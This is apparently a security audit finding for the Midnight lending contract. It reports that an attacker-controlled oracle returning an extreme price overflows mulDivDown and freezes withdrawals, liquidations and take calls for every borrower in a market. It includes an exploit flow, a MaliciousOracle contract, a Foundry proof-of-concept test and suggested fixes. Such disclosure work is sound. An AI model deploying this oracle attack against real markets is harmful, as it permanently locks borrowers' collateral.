### Title
Unchecked oracle price overflow in `mulDivDown` freezes `isHealthy`, `withdrawCollateral`, `liquidate`, and `take` for all borrowers in a market - (File: src/Midnight.sol)

### Summary
`UtilsLib.mulDivDown` uses plain Solidity 0.8 checked arithmetic `(x * y) / d` with no `unchecked` block. When `IOracle.price()` returns a value large enough that `collateral * price > type(uint256).max`, the multiplication panics and reverts. Because `isHealthy` is called unconditionally by `withdrawCollateral`, `liquidate`, and `take` for any borrower with debt, a single oracle returning an extreme price permanently freezes all three operations for every borrower in that market. The formal verification spec `NoMultiplicationOverflow.spec` explicitly treats price boundedness as an external assumption, not an enforced on-chain invariant.

### Finding Description

**Root cause — `mulDivDown` is plain checked arithmetic:**

```solidity
// src/libraries/UtilsLib.sol:29-31
function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
    return (x * y) / d;   // Solidity 0.8 checked: reverts on overflow
}
``` [1](#0-0) 

There is no `unchecked` block. Any `x * y > type(uint256).max` panics.

**Overflow site — `isHealthy`:**

```solidity
// src/Midnight.sol:953-955
uint256 price = IOracle(collateralParam.oracle).price();
maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
    .mulDivDown(collateralParam.lltv, WAD);
``` [2](#0-1) 

`_position.collateral[i]` is `uint128` (max ≈ 3.4 × 10³⁸). `ORACLE_PRICE_SCALE = 1e36`. Overflow occurs when `collateral * price > type(uint256).max ≈ 1.16 × 10⁷⁷`. For `collateral = type(uint128).max`, the threshold is `price > 2^128 ≈ 3.4 × 10³⁸`. For `collateral = 116 001`, the threshold is already breached at `price = 1e72` — a value the existing test suite itself uses (`ORACLE_PRICE_SCALE * 1e36`). [3](#0-2) 

**Identical overflow site in `liquidate`:** [4](#0-3) 

**`withdrawCollateral` calls `isHealthy` unconditionally for any borrower with debt:** [5](#0-4) 

**`take` calls `isHealthy` for the seller:** [6](#0-5) 

**No oracle price cap is enforced at market creation.** `touchMarket` validates `lltv` tiers, `maxLif`, sorted collaterals, maturity, and collateral count, but places no bound on the oracle address or the value it may return.

**The formal verification spec explicitly treats this as an assumption, not a proven invariant:**

```
// Oracle integration assumption: every (collateralAmount * oraclePrice) fits in uint256.
function boundedPrice(address oracle) returns uint256 {
    uint256 price;
    require to_mathint(price) * max_uint128 + ORACLE_PRICE_SCALE() - 1 <= max_uint256, ...
    return price;
}
``` [7](#0-6) 

The `noMultiplicationOverflow` rule is scoped only to calls where this assumption holds; `isHealthy` has its own dedicated rule that also requires the same assumption. [8](#0-7) 

**Exploit flow:**
1. Attacker (unprivileged market creator) deploys an oracle contract with a `setPrice(uint256)` function, initially returning a normal price.
2. Attacker calls `touchMarket` with this oracle — permissionless, no price validation.
3. Borrowers supply collateral and take debt in the market.
4. Attacker calls `oracle.setPrice(type(uint256).max)` (or any value exceeding `type(uint256).max / collateral`).
5. Every subsequent call to `withdrawCollateral`, `liquidate`, or `take` for any borrower with debt in this market reverts with an arithmetic panic inside `mulDivDown`.
6. Borrowers cannot recover their collateral; liquidators cannot liquidate; the market is permanently frozen.

### Impact Explanation

All borrowers in the affected market are frozen: `withdrawCollateral` reverts at the `isHealthy` call, `liquidate` reverts at the identical `mulDivDown` inside its own price loop, and `take` reverts at its post-callback `isHealthy` check. Collateral is permanently locked in the contract with no recovery path, directly violating the invariant that "collateral cannot be withdrawn or seized outside health/liquidation rules" — here the rules themselves become unreachable.

### Likelihood Explanation

Market creation is fully permissionless. The attacker needs only to deploy a two-function oracle contract (`price()` + `setPrice()`), create a market, and wait for borrowers. The price threshold for overflow is not astronomically high: at `price = 1e72` (a value already used in the test suite), any borrower with collateral > ~116 000 tokens triggers the revert. The attack is repeatable across any number of markets and is irreversible once triggered.

### Recommendation

Cap the oracle price inside `isHealthy` and `liquidate` before the multiplication, or switch `mulDivDown` to use `mulmod`-based 512-bit intermediate arithmetic (as used in Uniswap's `FullMath`) so the product never overflows. The minimal targeted fix is to add a price cap at market creation or at call time:

```solidity
// Option A: cap in mulDivDown (use assembly mulmod)
// Option B: enforce at touchMarket:
require(collateralParam.oracle.price() <= type(uint256).max / type(uint128).max, OraclePriceTooHigh());
// Option C: cap inside isHealthy/liquidate before the multiply:
uint256 price = UtilsLib.min(IOracle(collateralParam.oracle).price(), type(uint256).max / type(uint128).max);
```

The formal verification assumption in `NoMultiplicationOverflow.spec` should be converted to an enforced on-chain invariant.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.34;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {Market, CollateralParams} from "src/interfaces/IMidnight.sol";
import {ORACLE_PRICE_SCALE, WAD, LLTV_2, LIQUIDATION_CURSOR_LOW, maxLif} from "src/libraries/ConstantsLib.sol";

contract MaliciousOracle {
    uint256 public price = ORACLE_PRICE_SCALE; // normal initially
    function setPrice(uint256 p) external { price = p; }
}

contract OraclePriceOverflowTest is Test {
    Midnight midnight;
    MaliciousOracle oracle;
    Market market;
    address borrower = address(0xB0);

    function setUp() public {
        midnight = new Midnight(...);
        oracle = new MaliciousOracle();
        market.loanToken = address(loanToken);
        market.maturity = block.timestamp + 100 days;
        market.collateralParams.push(CollateralParams({
            token: address(collateralToken),
            lltv: LLTV_2,
            maxLif: maxLif(LLTV_2, LIQUIDATION_CURSOR_LOW),
            oracle: address(oracle)
        }));
        midnight.touchMarket(market);
        // borrower supplies collateral and takes debt
        // collateral amount > 116_001 tokens (to overflow at price=1e72)
        _setupBorrowerWithDebt(200_000e18);
    }

    function testOraclePriceOverflowFreezesMarket() public {
        bytes32 id = midnight.toId(market);
        // Sanity: isHealthy works at normal price
        assertTrue(midnight.isHealthy(market, id, borrower));

        // Attacker sets extreme price
        oracle.setPrice(type(uint256).max);

        // isHealthy now reverts — assert it does NOT silently return false
        vm.expectRevert(); // arithmetic panic 0x11
        midnight.isHealthy(market, id, borrower);

        // withdrawCollateral is frozen
        vm.prank(borrower);
        vm.expectRevert();
        midnight.withdrawCollateral(market, 0, 1, borrower, borrower);

        // liquidate is frozen
        vm.expectRevert();
        midnight.liquidate(market, 0, 0, 1, borrower, false, address(this), address(0), "");
    }
}
```

**Expected assertions:** all three calls revert with Solidity arithmetic panic `0x11` (overflow), confirming the market is permanently frozen for all borrowers.
